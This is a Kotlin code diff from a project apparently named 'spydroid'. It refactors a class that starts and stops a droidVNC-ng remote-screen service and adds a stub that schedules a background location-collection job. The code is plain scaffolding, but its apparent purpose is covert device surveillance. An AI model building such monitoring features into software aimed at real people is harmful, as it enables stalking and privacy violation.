@@ -4,18 +4,20 @@ import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.preference.PreferenceManager
+import androidx.work.OneTimeWorkRequest
+import androidx.work.WorkManager
+import androidx.work.WorkRequest
 import net.christianbeier.droidvnc_ng.Constants
 import net.christianbeier.droidvnc_ng.Defaults
 import net.christianbeier.droidvnc_ng.VncService
+import net.spydroid.feature.location.LocationWork
 
 @Suppress("DEPRECATION")
-class ManagerFeatures(private val context: Context) {
+class ManagerFeatures(
+    private val context: Context
+) {
 
-    private val vncHandler by lazy { VNC() }
-
-    fun vnc() = vncHandler
-
-    inner class VNC {
+    inner class vnc {
         fun start() {
             val intent = Intent(context, VncService::class.java)
             val prefs = PreferenceManager.getDefaultSharedPreferences(context)
@@ -62,6 +64,18 @@ class ManagerFeatures(private val context: Context) {
             intent.setAction(VncService.ACTION_STOP)
             context.stopService(intent)
         }
+    }
 
+    inner class location() {
+        fun start() {
+            val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(LocationWork::class.java).build()
+            WorkManager.getInstance(context).enqueue(myWorkRequest)
+            //val intent = Intent(context, LocationActivity::class.java)
+            //context.startActivity(intent)
+        }
+
+        fun stop() {
+            //val intent = Intent(context, LocationActivity::class.java)
+        }
     }
 }
